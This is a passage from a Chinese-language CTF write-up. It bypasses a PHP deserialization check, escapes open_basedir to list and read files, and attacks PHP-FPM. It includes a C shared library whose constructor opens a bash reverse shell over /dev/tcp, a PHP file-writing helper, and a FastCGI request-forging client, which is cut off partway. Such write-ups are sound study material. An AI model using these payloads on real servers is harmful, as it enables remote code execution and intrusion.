class="hljs-number">9223372036854775807</span>。<br></code></pre></td></tr></table></figure><p>构造data&#x3D;<strong>9223372036854775806</strong>即可绕过第一层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$count</span>=<span class="hljs-number">9223372036854775806</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br>O%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>User%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>count%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A9223372036854775806%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>然后第二层传入一个phpinfo看看，可以看到disable functions基本全都禁用了</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220711174621.png"></p><p>然后open_basedir限制我们只能读取Web服务根目录下的文件，所以还需要绕过open_basedir</p><p>具体参考：<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></p><p>由于eval可以执行<strong>多条PHP语句</strong></p><p>所以可以构造如下payload绕过，然后就可以列出根目录下的文件</p><p>利用php5增加的一个类DirectoryIterator，为用户供一个简单的查看目录的接口</p><p>可以在php5.3后对目录进行列举</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>或者这一种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;tt&#x27;</span>); <br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;tt&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>); <span class="hljs-comment">//chdir次数等同于Web目录返回根目录所需次数再加1</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>));<br><br></code></pre></td></tr></table></figure><p><img src="C:\Users\kaife\AppData\Roaming\Typora\typora-user-images\image-20220711175315114.png" alt="image-20220711175315114"></p><p>然后构造出读取文件的Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;tt&#x27;</span>); <br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;tt&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>); <span class="hljs-comment">//chdir次数等同于Web目录返回根目录所需次数再加1</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/usr/local/etc/php/php.ini&#x27;</span>));<br></code></pre></td></tr></table></figure><p>我们可以在&#x2F;usr&#x2F;local&#x2F;etc&#x2F;目录下找到FPM文件，就可以看出这道题使用了php-fpm</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220712093956.png"></p><p>然后读取一下fpm的配置文件，看到fpm运行在9001端口</p><p><img src="C:\Users\kaife\AppData\Roaming\Typora\typora-user-images\image-20220712094906829.png" alt="image-20220712094906829"></p><p>然后就是对FPM进行攻击</p><p>参考P神的文章进行学习：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>首先写一个反弹shell的so</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在写一个接受文件的php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] ?? <span class="hljs-string">&#x27;/tmp/file&#x27;</span>;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>] ?? <span class="hljs-string">&#x27;:)&#x27;</span>;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>.<span class="hljs-variable">$data</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>);<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$data</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后使用蚁剑将恶意so文件传到靶机上</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220712105344.png"></p><p>然后就是伪造恶意FastCGI请求</p><p>网上恒古不变的伪造请求代码，修改几个配置即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Note : Code is released under the GNU LGPL</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Please do not change the header of this file</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span><br><span class="hljs-comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span><br><span class="hljs-comment"> * the License, or (at your option) any later version.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span><br><span class="hljs-comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * See the GNU Lesser General Public License for more details.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Handles communication with a FastCGI application</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="hljs-doctag">@webstart</span>.fr&gt;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span>     1.0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FCGIClient</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">VERSION_1</span>            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BEGIN_REQUEST</span>        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ABORT_REQUEST</span>        = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">END_REQUEST</span>          = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PARAMS</span>               = <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STDIN</span>                = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STDOUT</span>               = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STDERR</span>               = <span class="hljs-number">7</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DATA</span>                 = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">GET_VALUES</span>           = <span class="hljs-number">9</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">GET_VALUES_RESULT</span>    = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">UNKNOWN_TYPE</span>         = <span class="hljs-number">11</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAXTYPE</span>              = <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">UNKNOWN_TYPE</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">RESPONDER</span>            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AUTHORIZER</span>           = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FILTER</span>               = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">REQUEST_COMPLETE</span>     = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CANT_MPX_CONN</span>        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">OVERLOADED</span>           = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">UNKNOWN_ROLE</span>         = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_CONNS</span>            = <span class="hljs-string">&#x27;MAX_CONNS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_REQS</span>             = <span class="hljs-string">&#x27;MAX_REQS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MPXS_CONNS</span>           = <span class="hljs-string">&#x27;MPXS_CONNS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">HEADER_LEN</span>           = <span class="hljs-number">8</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Socket</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Resource</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_sock</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Host</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> String</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_host</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Port</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Integer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_port</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Keep Alive</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Boolean</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_keepAlive</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Constructor</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $host Host of the FastCGI application</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $port Port of the FastCGI application</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span> = <span class="hljs-number">9001</span></span>) // <span class="hljs-title">and</span> <span class="hljs-title">default</span> <span class="hljs-title">value</span> <span class="hljs-title">for</span> <span class="hljs-title">port</span>, <span class="hljs-title">just</span> <span class="hljs-title">for</span> <span class="hljs-title">unixdomain</span> <span class="hljs-title">socket</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;_host = <span class="hljs-variable">$host</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;_port = <span class="hljs-variable">$port</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Define whether or not the FastCGI application should keep the connection</span><br><span class="hljs-comment">     * alive at the end of a request</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setKeepAlive</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;_keepAlive = (<span class="hljs-keyword">boolean</span>)<span class="hljs-variable">$b</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;_keepAlive &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;_sock) &#123;<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;_sock);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Get the keep alive status</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getKeepAlive</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;_keepAlive;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Create a connection to the FastCGI application</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;_sock) &#123;<br>            <span class="hljs-comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span><br>            <span class="hljs-variable language_">$this</span>-&gt;_sock = <span class="hljs-title function_ invoke__">stream_socket_client</span>(<span class="hljs-variable">$this</span>-&gt;_host, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">5</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;_sock) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Unable to connect to FastCGI application&#x27;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Build a FastCGI packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $type Type of the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $content Content of the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $requestId RequestId</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildPacket</span>(<span class="hljs-params"><span class="hljs-variable">$type</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$requestId</span> = <span class="hljs-number">1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$clen</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">VERSION_1</span>)         <span class="hljs-comment">/* version */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$type</span>)                    <span class="hljs-comment">/* type */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$requestId</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-comment">/* requestIdB1 */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$requestId</span> &amp; <span class="hljs-number">0xFF</span>)        <span class="hljs-comment">/* requestIdB0 */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>((<span class="hljs-variable">$clen</span> &gt;&gt; <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xFF</span>)     <span class="hljs-comment">/* contentLengthB1 */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$clen</span> &amp; <span class="hljs-number">0xFF</span>)             <span class="hljs-comment">/* contentLengthB0 */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* paddingLength */</span><br>            . <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* reserved */</span><br>            . <span class="hljs-variable">$content</span>;                     <span class="hljs-comment">/* content */</span><br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Build an FastCGI Name value pair</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $name Name</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $value Value</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> String FastCGI Name value pair</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildNvpair</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$nlen</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$name</span>);<br>        <span class="hljs-variable">$vlen</span> = <span class="hljs-title 